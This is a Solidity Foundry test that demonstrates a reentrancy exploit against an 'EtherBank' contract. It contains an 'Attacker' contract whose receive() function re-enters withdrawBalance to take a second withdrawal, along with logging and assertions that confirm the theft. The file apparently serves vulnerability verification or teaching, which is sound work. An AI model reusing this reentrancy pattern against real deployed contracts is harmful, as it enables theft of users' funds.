// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/etherbank.sol";

contract EtherBankTest is Test {
    EtherBank public bank;
    Attacker public attacker;
    
    function setUp() public {
        // Deploy the EtherBank contract
        bank = new EtherBank();
        
        // Deploy the Attacker contract
        attacker = new Attacker(bank);
        
        // Victim deposits 2 ether
        vm.deal(address(this), 2 ether);
        bank.addToBalance{value: 2 ether}();
    }

    function testReentrancyAttack() public {
        // Capture initial state
        uint256 preBankBalance = address(bank).balance;
        uint256 preAttackerDeposit = bank.getBalance(address(attacker));
        uint256 preVictimDeposit = bank.getBalance(address(this));
        uint256 preTotalWithdrawals = bank.totalWithdrawals();
        
        console2.log("--- BEFORE-Trigger State ---");
        console2.log("Bank ETH Balance: %d", preBankBalance);
        console2.log("Attacker Deposit Balance: %d", preAttackerDeposit);
        console2.log("Victim Deposit Balance: %d", preVictimDeposit);
        console2.log("Total Withdrawals: %d", preTotalWithdrawals);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();
        console2.log("Attack executed");

        console2.log("--- AFTER-Trigger State ---");
        // Capture post-attack state
        uint256 postBankBalance = address(bank).balance;
        uint256 postAttackerDeposit = bank.getBalance(address(attacker));
        uint256 postVictimDeposit = bank.getBalance(address(this));
        uint256 postTotalWithdrawals = bank.totalWithdrawals();
        
        console2.log("Bank ETH Balance: %d", postBankBalance);
        console2.log("Attacker Deposit Balance: %d", postAttackerDeposit);
        console2.log("Victim Deposit Balance: %d", postVictimDeposit);
        console2.log("Total Withdrawals: %d", postTotalWithdrawals);

        console2.log("--- Comparison ---");
        uint256 attackWithdrawalAmount = postTotalWithdrawals - preTotalWithdrawals;
        console2.log("Total Withdrawals during attack: %d", attackWithdrawalAmount);
        
        // Final vulnerability verdict
        if (attackWithdrawalAmount == 2 ether) {
            console2.log("Vulnerability Exists: Reentrancy allowed double withdrawal (2 ether)");
        } else {
            console2.log("Vulnerability not Exist: Only %d ether withdrawn (expected 2 ether)", attackWithdrawalAmount);
        }

        // Original validation assertions
        uint256 initialBankBalance = preBankBalance;
        uint256 initialAttackerBalance = preAttackerDeposit; 
        
        assertEq(address(attacker).balance, initialAttackerBalance + 2 ether, "Attacker should have stolen 2 ether");
        assertEq(
            address(bank).balance, 
            initialBankBalance + 1 ether - 2 ether,
            "Bank balance should be reduced by 2 ether"
        );
    }
}

contract Attacker {
    EtherBank public bank;
    uint256 public reentrancyCount;

    constructor(EtherBank _bank) {
        bank = _bank;
    }

    function attack() external payable {
        require(msg.value > 0, "Attacker needs funds");
        // Deposit to create initial balance
        bank.addToBalance{value: msg.value}();
        
        // Start the reentrancy attack
        reentrancyCount = 0;
        bank.withdrawBalance();
    }

    receive() external payable {
        if (reentrancyCount < 1) {
            reentrancyCount++;
            // Re-enter withdrawBalance before balance is reset
            bank.withdrawBalance();
        }
    }
}